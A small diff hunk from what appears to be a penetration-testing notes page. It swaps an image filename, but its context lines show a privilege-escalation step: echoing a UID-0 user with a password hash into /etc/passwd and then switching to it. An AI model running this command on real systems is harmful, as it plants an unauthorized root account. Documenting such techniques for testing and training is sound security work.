@@ -82,7 +82,7 @@ echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
 cat /etc/passwd
 ```
 
-<figure><img src="../../.gitbook/assets/image (6) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (3) (3).png" alt=""><figcaption></figcaption></figure>
 
 ```
 su new
